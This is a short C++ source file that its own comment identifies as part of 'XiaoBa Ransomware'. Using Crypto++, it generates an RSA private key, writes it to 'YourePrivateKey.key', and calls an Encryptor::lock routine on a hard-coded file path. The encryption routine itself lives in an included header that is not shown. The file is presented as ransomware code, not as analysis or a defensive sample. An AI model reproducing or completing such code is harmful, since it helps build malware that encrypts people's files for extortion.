#include <Windows.h>
#include <iostream>
#include <cryptopp/rsa.h>
#include <cryptopp/files.h>
#include <cryptopp/secblock.h>
#include "include.h" //Includes For XiaoBa Ransomware :D
using namespace std;
AutoSeededRandomPool prng;
void Save(const std::string filename, const CryptoPP::BufferedTransformation& bt) {
	CryptoPP::FileSink file(filename.c_str());
	bt.CopyTo(file);
	file.MessageEnd();

}
void SaveKey(const std::string filename, const CryptoPP::RSA::PrivateKey& key) {
	CryptoPP::ByteQueue queue;
	key.Save(queue);
	Save(filename, queue);
}
int main() 
{
	CryptoPP::RSA::PrivateKey rsaPrivate;
	rsaPrivate.GenerateRandomWithKeySize(prng, 3072);
	std::string path_new = std::filesystem::current_path().string() + "\\YourePrivateKey.key";
	SaveKey(path_new, rsaPrivate);
	Encryptor::lock("C:\\Dumper-7\\4.26.2-15973114+++UE4+Release-4.26-Carnal_Instinct_MAPPINGS\\4.26.2-15973114+++UE4+Release-4.26.usmap", Encryptor::generate_key(), Encryptor::generate_iv());
	return 0;
}
